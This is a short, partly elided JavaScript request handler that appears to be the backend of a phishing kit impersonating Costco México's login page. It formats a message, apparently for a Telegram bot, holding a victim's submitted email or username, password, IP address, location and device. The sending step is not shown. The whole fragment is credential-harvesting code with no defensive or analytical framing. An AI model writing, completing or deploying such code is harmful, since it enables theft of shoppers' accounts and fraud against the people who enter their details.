...
export default async function handler(req, res) {
  ...
  try {
    ...
    let message = `🛒 <b>Costco México Login Submission</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `👤 <b>Usuario / Email:</b> <code>${safeAccessCode}</code>\n`;
    message += `🔑 <b>Contraseña:</b> <code>${safePassword}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `🌍 <b>IP:</b> <code>${safeIp}</code>\n`;
    message += `📍 <b>Ubicación:</b> ${safeLocation}\n`;
    message += `💻 <b>Dispositivo:</b> ${safeDevice}\n`;
    message += `⏰ <i>Fecha: ${new Date().toLocaleString()}</i>`;
